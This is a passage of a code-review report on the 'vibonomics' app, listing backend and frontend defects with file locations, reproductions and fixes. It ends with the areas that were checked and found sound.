- **Failure:** right after every reset the status line sends `used_percentage: 1`, which shows as **100%**. 0.5 shows
  50%, 1.5 shows 150%, and 1% of context shows as 100%.
- Reproduction:
  `normalize_statusline({"rate_limits":{"five_hour":{"used_percentage":1,"resets_at":2000000000}}})` gives
  `used_percentage: 100.0`.
- `spend_limit.used_percentage` goes through `_num` and is not rescaled, so a single payload disagrees with itself.
- The tests use only 23.5, 41.2 and 8, so they miss this.
- **Fix:** don't rescale `used_percentage`. Rescale only `utilization` (the OAuth endpoint), and only after
  confirming that endpoint's unit. Add tests for 0.5 and 1.

**J-2 — Medium — `backend/vibonomics/scheduler.py:50-51` and `:65-67`. [lead-verified by reading, reproduced by the area reviewer]**
- **Defect:** `reschedule()` re-adds **every** refresh job, plus the preset sync, with `replace_existing=True` on
  every `PUT /api/settings`. APScheduler's interval trigger restarts at now + interval.
- **Failure:** every Settings section saves through that route. An operator who saves anything at least daily means
  the 24 h benchmark refresh and a 24 h preset auto-apply never run. A restart resets the timers too. Startup
  refreshes the `KINDS`, but not the preset (P-15).
- **Fix:** leave a job alone when its interval has not changed, or carry `next_run_time` over from the existing job.

**J-3 — Medium — `backend/vibonomics/db.py:56-59`. [lead-verified, reproduced]**
- **Defect:** in FastAPI 0.162, a dependency that yields runs its teardown, which here is `get_session`'s commit,
  **after the response is sent**.
- **Failure:** the proof's client received `200 {"saved": true}`, then the commit raised `IntegrityError`, and nothing
  was stored. Related problems:
  - `DELETE /api/subscription/claude` (`api/subscriptions.py:184-188`) never flushes, so its DELETEs run after the
    204 has been sent.
  - It, and `put_settings` (`api/settings.py:169-172`), publish their SSE event before the commit, so a refetch
    triggered by that event can read the old state.
  - `put_settings` also calls `reschedule()` before the commit (see J-9).
- **Fix:**
  - Use `Depends(get_session, scope="function")`, which this FastAPI supports, or commit explicitly before
    returning.
  - Publish events, and reschedule, after the commit.

**J-4 — Medium (latent data loss) — `db.py:31` with `backend/vibonomics/migrations/__init__.py:26-30`, `migrations/env.py:17`. [lead-verified, reproduced]**
- **Defect:** `PRAGMA foreign_keys=ON` is set on every connection. Migrations run inside a transaction, where that
  pragma cannot be changed, and `render_as_batch=True` is set.
- **Failure:** a batch operation that has to rebuild a table (`alter_column`, `drop_column`, a changed constraint)
  drops the old table. With foreign keys on, the drop fires ON DELETE CASCADE:
  - Rebuild `provider_configs`: every `models`, `price_history`, `balances`, `usage_days` and `usage_keys` row goes.
    The proof ended with providers 1, models 0, balances 0.
  - Rebuild `models`: `price_history` goes.
  - Rebuild `eval_runs`: `eval_results` goes.
- **Why nothing has happened yet:** the existing migrations only added columns, which SQLite does natively. But the
  downgrade of `d317adb258f3` (`drop_column` on `provider_configs`) would rebuild, and so would the next autogenerated
  revision that changes a column. It would run at startup.
- **Fix:** in `upgrade_to_head`, run `PRAGMA foreign_keys=OFF` on the connection before the transaction begins, then
  run the upgrade, then `PRAGMA foreign_key_check`, then switch it back on. Add a test that rebuilds a parent table
  and checks the child rows survive.

**J-5 — Medium — `backend/vibonomics/benchmarks/matching.py:188` (consulted first, at `:268-273`).**
- **Defect:** `_by_provider_id.setdefault(mid.lower(), cid)` maps a bare provider model id to whichever provider
  comes first in the catalogue, not to the model's creator. Unlike the other indexes, it does not drop ambiguous
  keys with `_unique`, and id hints are checked before any name logic.
- **Failure:** a reseller listed before the creator serves `deepseek-chat` as `deepseek/deepseek-v3`. A LiveBench row
  for `deepseek-chat` then attaches to the wrong model, and reordering the catalogue flips the answer.
- **Fix:** prefer the creator's listing, and drop bare ids that map to more than one canonical id.
- Reproduced on a synthetic catalogue; how often it happens on live models.dev was not measured.

**J-6 — Medium — `backend/vibonomics/jobs.py:81-82`, `api/providers.py:398-401`, `frontend/src/pages/settings/ProvidersSection.tsx:131-134`.**
- **Defect:** saving a provider fires `POST /api/providers/refresh`. If a models run is already in progress (the
  startup run, the schedule, or "refresh all"), `run_job` returns at once. The run in flight loaded the provider list
  before the save, so it either leaves the new provider out or uses its old key.
- **Failure:** the operator gets "Saved. Refreshing…", and the new provider shows 0 models until the next scheduled
  run, with no event or run row to explain why.
- This follows from the documented "drop, don't queue" rule, so it is a design decision to revisit, not a slip.
- **Fix:** remember dropped `provider_ids` and run them once the lock frees, or let provider-scoped runs wait for the
  lock.

**J-7 — Medium-low — `jobs.py:361-362`, `backend/vibonomics/api/benchmarks.py:38-62`, `scoring.py:139`.**
- **Defect:** a source that is disabled, or Artificial Analysis after its terms are un-acknowledged, is never
  refreshed again, so its rows are never deleted. The comment in `scoring.py` assumes a next refresh that never
  comes.
- **Failure:** `GET /api/benchmarks/rows` does not filter by `source_in_use`. It keeps serving AA values
  indefinitely, **including to anonymous open-read visitors**, which matters given AA's terms.
- **Fix:** delete a source's rows when it is turned off, and filter `/rows` by `source_in_use`.

**J-8 — Medium-low — Claude ingest normalisation. `subscriptions.py:127, 163, 194-196`; `api/subscriptions.py:156-157, 214-215`.**
- **Defect:** `model`, `session_id` and `version` are stored verbatim.
- **Failures:**
  - A token holder posts `{"model": {"display_name": {"x": 1}}}` or `"version": 3`. The post gets 202, and then
    `GET /api/subscription/claude` **returns 500** until a good snapshot arrives.
  - A 400 KB `session_id` is stored as is, in each of the 20 history rows.
  - `total_duration_ms: 1e999` raises `OverflowError`, giving 500 instead of 400.
  - Deeply nested JSON raises a `RecursionError` that nothing catches.
- This contradicts "snapshots normalised, usage numbers only".
- **Fix:**
  - Coerce those fields to capped strings, and drop or cap `session_id`.
  - Make `_num` reject non-finite values.
  - Return 400 on `RecursionError` and `ValueError`.
  - Make the GET tolerate a bad stored row.

**J-9 — Low — `jobs.py:84, 103`.**
- **Defect:** `_start_run` and `_finish_run` sit outside the `try`.
- **Failure:** a DB error there (for example "database is locked" after the 60 s busy timeout) leaves the RefreshRun
  `running` until restart, and `refresh.finished` is never sent, so the UI spinner sticks. The sequences in
  `api/refresh.py:42-45`, `app.py:42-45` and `api/providers.py:398-401` then abort their remaining kinds.
- **Fix:** publish `refresh.finished` in a `finally`, and catch per kind in the sequence loops.

**J-10 — Low — settings bounds. `settings_store.py:18-21, 77-79`; `api/settings.py:167-172`.**
- **Defect:** the refresh intervals have no upper bound and accept infinity, and so do the scoring weights.
- **Failure:** `benchmarks_interval_hours=1e12` makes the PUT fail with 500 and roll back, but only after the
  scheduler has applied the other new intervals. The live schedule then differs from the saved settings until a
  restart.
- **Fix:** add `le=` bounds and `allow_inf_nan=False`, and reschedule after the commit.

**J-11 — Low — `api/subscriptions.py:132`.**
- **Defect:** `hmac.compare_digest` on `str` raises `TypeError` for a non-ASCII value.
- **Failure:** an **unauthenticated** request with `?token=é` gets a 500 and a logged traceback, instead of 401.
  There is no bypass.
- **Fix:** compare UTF-8 bytes.

**J-12 — Low — `jobs.py:472-475`; `benchmarks/openrouter_aa.py:24-26, 70, 108`; `benchmarks/openrouter_datasets.py:240-244`.**
- **Defect:** these sources return `[]` on an unexpected response shape. The refresh then counts as `ok`, and every
  stored row for the source is deleted.
- This contradicts `benchmarks/base.py:15` ("return [] only when genuinely empty").
- **Fix:** raise `FetchError`, or report `partial_errors`.

**J-13 — Low — `backend/vibonomics/api/refresh.py:67-68`.**
- **Defect:** `min(limit, 500)` lets a negative limit through. SQLite treats `LIMIT -1` as unlimited, and the route
  is open-read.
- **Growth:** `refresh_runs` is never pruned (about 55 rows a day) and has no index on `kind`.
- **Fix:** `Query(50, ge=1, le=500)`, a retention period, and an index on `(kind, id)`.

**J-14 — Low — `matching.py:297-298`, `api/benchmarks.py:66-75`.**
- **Defect:** an operator alias to a canonical id the catalogue does not list counts as a match. The score attaches
  to nothing, and the name disappears from the unmatched list.
- Curated aliases already get this check (F17); operator aliases don't.
- **Fix:** validate in `set_alias`, and treat a stale operator target like a stale curated one.

**J-15 — Low — `jobs.py:528-529` versus `:544-568`.**
- **Defect:** `rematch_scores` reads the aliases before `_apply`'s transaction.
- **Failure:** two alias saves in quick succession can commit out of order, which reverts the second mapping until
  the next refresh.
- **Fix:** read the aliases inside the write transaction, as `persist_scores` already does.

---

## Frontend: app shell, data layer, Settings, test pages

**F-1 — Medium (AGENTS rule) — `frontend/src/lib/tone.ts:7`; the same formula is in `frontend/src/lib/providerColors.ts:58`. [lead-verified]**
- **Defect:** in light mode `tone()` uses shade 8. `theme.ts` sets `primaryShade` to 8, so that is the same colour
  as the stock `c="green"` the helper exists to avoid. Shade 8 on white gives:

  | Colour | Contrast |
  |---|---|
  | green (`#2f9e44`, re-computed by the lead) | 3.45 |
  | teal | 3.95 |
  | orange | 3.58 |
  | yellow | 2.48 |
  | lime | 2.93 |
  | cyan | 4.35 |

  All of these are below the 4.5 that AA requires for body text. Dark mode passes everywhere.
- **Where it shows:** every score number in the Models table (`components/models/cells.tsx:27`), the OK message
  after a provider test, the balance and login-token warnings (yellow), and provider names such as OpenAI and Groq.
  Stock light badges (shade 9 on shade 1) fail too: yellow 2.69, orange 3.62, green 3.81, teal 4.33 ("Partial",
  "Terms apply", "Live").
- **Fix:**
  - Use a darker light shade per colour. 9 works for teal and cyan; green, lime, yellow and orange need darker than
    the palette has, for example `color-mix(in srgb, var(--mantine-color-X-9) 75%, black)`.
  - Override `--mantine-color-X-light-color` in `theme.ts`.
  - Add a unit test that computes contrast for every colour passed to `tone()`.

**F-2 — Medium — `frontend/src/api/EventStreamProvider.tsx:192-196`. [lead-verified by reading]**
- **Defect:** on reconnect, only `keys.refreshStatus` is invalidated, despite the comment "anything may have
  changed". The server does not replay missed events, and `refetchOnWindowFocus` is off (`App.tsx:86`).
- **Failure:** after a laptop sleeps, a phone tab is backgrounded, or a proxy drops the stream, the Models page keeps
  stale prices and balances until some later event happens to touch them.
- **Fix:** on every `onopen` after the first, call `client.invalidateQueries()`.

**F-3 — Medium (AGENTS rule) — `frontend/src/pages/settings/ProvidersSection.tsx:314-315`; `backend/vibonomics/api/providers.py:349-352`. [lead-verified by reading]**
- **Defect:** testing an existing provider sends a cleared Base URL as `undefined`, so the server tests the stored
  override. Save sends `''`, which resets it. Cleared options are dropped the same way, and `_override` merges what
  is sent over the stored options.
- **Failure:** the test checks something other than what Save will store. That breaks "tests use the unsaved form".
- **Fix:**
  - Send `base_url: baseUrl.trim()`; the backend already maps `''` to None, and then withholds keys for the new host.
  - Send cleared options as `''`.
  - Make `_override` replace the options, as `update_provider` does.

**F-4 — Medium-low — `frontend/src/pages/SettingsPage.tsx:86-93`, `frontend/src/pages/settings/useSettingsDraft.ts:14,41-46`.**
- **Defect:** unsaved edits vanish without a prompt, because each section's draft lives in component state and
  switching section unmounts it. There is no `useBlocker` and no `beforeunload`.
- **Failure:**
  - A benchmark key that was typed but not saved is lost.
  - A 401 swaps the whole tree for `LoginScreen`, which drops the draft whose Save triggered it.
  - A failed save after navigating away shows nothing, because the error toast is a per-`mutate` callback.
- **Fix:**
  - Use `useBlocker(dirty)` and add a `beforeunload` handler.
  - Move the toast to the mutation's `onError`.

**F-5 — Medium-low — `frontend/src/components/UsageWindows.tsx:15`, `frontend/src/components/ModelDetailsModal.tsx:216`.**
- **Defect:** text is coloured with `c={usageColor(…)}` / `c={scoreColor(…)}`, which is shade 8 in both schemes, not
  with `tone()`.
- **Failure:** in dark mode, UsageWindows is 3.44–4.34:1 (red, teal, orange). In light mode, yellow is 2.48:1.
- **Fix:** use `tone()`, together with F-1.

**F-6 — Low-medium — `EventStreamProvider.tsx:197-203`.**
- **Defect:** while the page is idle, a lost session is never noticed. The EventSource's 401 only reaches `onerror`,
  so the page retries every 5 s over stale data and the login card never appears.
- **Fix:** when the source is closed, invalidate `keys.auth`. `/api/auth/status` is exempt from the guard, so the
  login gate then shows.

**F-7 — Low-medium — `frontend/src/components/models/BalanceBody.tsx:177-189`.**
- **Defect:** the per-card refresh button is not wrapped in `ChangeOnly`.
- **Failure:** open-read visitors see it, click it, and get a 401 toast.
- Also, the spinner only covers the 202 response, not the refresh itself.

**F-8 — Low — `frontend/src/api/system.ts:29`.**
- **Defect:** logout invalidates every query while the old components are still mounted. They refetch as the
  logged-out user, and the POST-backed `presetList` returns 401, which shows "That needs the password".
- **Fix:** `removeQueries` (or `clear()`) instead of invalidating.

**F-9 — Low — `GeneralSection.tsx:93`, `ScoringSection.tsx:303`, `SaveBar.tsx:17`.**
- **Defect:** the sections pass `dirty && valid` as `dirty`.
- **Failure:** an invalid draft also hides "Discard changes".
- **Fix:** give `SaveBar` a separate `canSave` prop.

**F-10 — Low — `ProvidersSection.tsx:463-476, 412-421, 570-574`.**
- **Defect:** all rows share one `useMutation`, and per-call callbacks fire only for the latest call.
- **Failure:**
  - Click Test on A, then on B: A's result never shows.
  - The delete dialog's error is never reset, so it carries over to the next provider.

**F-11 — Low (a11y) — `TestRunsModal.tsx:161`, `RunTestsModal.tsx:128`.**
- **Defect:** result rows expand on mouse click only, with no button and no `aria-expanded`. Mantine `Pill` remove
  buttons are `aria-hidden` with `tabIndex -1`.
- **Failure:** keyboard users can't open transcripts or drop a model from a run.

**F-12 — Low — `frontend/src/components/models/BalancesStrip.tsx:73-86`.**
- **Defect:** a second `opencode` provider is swallowed: its balance and its refresh errors appear nowhere.
  Anthropic duplicates get a card of their own.

**F-13 — Low — `frontend/src/pages/settings/RefreshSection.tsx:7` with `useSettingsDraft.ts:33-37`.**
- **Defect:** the Refresh section edits only `general.hide_inactive_models` but saves the whole `general` object.
- **Failure:** saving from two tabs reverts the other tab's instance rename.

**F-14 — Low — secrets as mutation variables.**
- **Where:** `system.ts:14`; `providers.ts:30, 38-39, 54-55, 62`; `settings.ts:13`.
- **Defect:** typed secrets stay in TanStack's MutationCache for the default 5-minute `gcTime`. They are in memory
  only, never persisted or rendered.
- **Fix:** set `gcTime: 0` on these mutations.

**Minor:**
- `App.tsx:68-70`: the "unreachable" state never retries, so a page loaded during a restart stays dead.
- `AppLayout.tsx:56`: once the colour toggle is used, there is no way back to following the OS.
- `ModelDetailsModal.tsx:609-611`: the modal flashes "Loading…" while it closes.

---

## Sandbox and evals (lead; light pass only, since both earlier reviews went deep here)

**S-1 — Low — `backend/tests/sandbox/test_run_uids.py:283`; `backend/vibonomics/sandbox/executor.py:94-97, 383-388`. [lead, reproduced]**
- **What happened:** `test_a_fork_bomb_stops_at_the_run_limit_and_is_cleaned_up` failed 4 out of 4 times here (as
  root). There were 127 survivors, **all zombies with parent PID 1**. This container's PID 1 reaped them a few seconds
  later.
- **Test:** the test checks immediately, so it races PID 1's reaping. It passes in the sidecar and in CI, where tini
  reaps at once (`init: true`). Make it poll for a few seconds, or count only processes that are not zombies.
- **Code:** the executor returns the uid to the pool (`_release_uid`) while that uid's zombies may still count against
  `RLIMIT_NPROC`. Under a slow reaper, the next run on that uid could get EAGAIN on its first forks. That is low risk
  with tini.
- **Fix:** before releasing the uid, wait (with a bound) for its process count to reach 0.

**S-2 — note.** The concurrency, fork-bomb and leftover-file cases are still exercised only under root. This session
was root in a Linux container, so the remaining `test_run_uids.py` cases did run, and passed. That is one more data
point for the record in `OUTSTANDING.md`.

**B-3 — Low — `backend/tests/test_routing.py:87-92`.** The test is not hermetic: it needs models.dev (see A-1).

---

## Checked and found fine

So these do not get re-raised:

- **Auth guard:**
  - `_route_path` handles a URL base.
  - `//api/...` and encoded paths do not slip past: they reach the SPA route, whose file check refuses absolute
    paths.
  - Open-read lets only GET/HEAD/OPTIONS and `POST /api/models/value` through.
  - Secrets are withheld from visitors on `/api/settings`, `/api/providers` and `/api/subscription/claude`.
  - The session cookie is bound to a digest of the password.
  - Login uses `compare_digest`.
- **Sandbox guard:** it uses the local address (`scope["server"]`), so forwarded headers cannot get round it.
- **Presets** (the `AGENTS.md` promises):
  - The `vibonomics-` prefix is always added, on save, on drafts, and in the UI's mirror of it.
  - Nothing ever deletes.
  - The single write path uses `retries=0`.
  - Dry run and apply share `make_plan`, and the digest covers the slug and the config.
  - A draft never applies, and the UI disables Apply for drafts and dirty forms.
  - Applies are serialised by `presets._lock`, and the scheduled sync takes the same lock.
  - Archived presets, presets with a system prompt, and hand-made presets block the plan.
  - `plan`, `apply` and `list` are POSTs.
  - Errors are scrubbed of secrets.
- **Usage history:**
  - Rows with an empty `key_hash` and per-key rows are never summed together.
  - Tokens are prompt plus completion, and cost is per 1M tokens.
  - Dates are handled in UTC, in the backend and the frontend alike.
  - Migration `ed69fee7cf17` matches the ORM.
  - The `usage` kind is wired everywhere `AGENTS.md` lists.
- **Price-maths parity:**
  - `pricing.ts` and `pricing.py` agree on the effective input price, task cost, value, the free-model
    short-circuit, and None/NaN/inf.
  - `test_value.py` mirrors every case in `pricing.test.ts`.
  - Neither copy models reasoning tokens, cache writes or batch discounts, consistently.
- **`/value` validation:**
  - NaN, inf, negative tokens, a cache rate outside [0, 1] and a minimum score outside [0, 100] are refused.
  - The sort is deterministic.
  - Infinite values serialise as null.
- **Snippets:**
  - No snippet carries a key.
  - `_CAN_PIN` lists only harnesses with a documented body slot.
  - The variant and provider checks match the frontend's.
  - The `client_restricted` note is advice only.
  - Escaping is correct for quotes, `#`, `:`, newlines, `$(…)` and YAML's boolean-like words (but see V-10).
- **Jobs:**
  - `run_job`'s check-and-acquire has no await in between, and the lock is released on exception.
  - `gather` waits for every provider before the lock is released.
  - `spawn` keeps strong references.
  - The scheduler uses `coalesce` and `max_instances=1`.
  - The SSE subscriber is removed on disconnect, through GZip, and GZip skips `text/event-stream`.
- **Timezones:** `UTCDateTime` stores naive UTC and returns aware values, and everything in scope uses aware `now`.
- **Ingest:** the token is checked before the body is read, and the cap is enforced while streaming. History is
  pruned to 20. The OAuth usage endpoint is never called with a refreshed token.
- **AA opt-in and licences:** fetching AA needs both `enabled` and the acknowledged terms (but see J-7 for the rows
  left behind afterwards). Every `SourceSpec` has an honest licence.
- **Frontend:**
  - Every fetch URL is relative (it works under `VIBONOMICS_URL_BASE`).
  - There is no `dangerouslySetInnerHTML`.
  - No secret is in localStorage or a URL.
  - The EventSource lifecycle is clean under StrictMode.
  - The 401 handling does not loop.
  - Balance cards send one refresh request per card.
  - Query keys don't collide.
  - Entity forms are keyed, so they reset.
  - Dark-mode `tone()` passes AA everywhere.
- **Generated API types** are in sync with the backend.
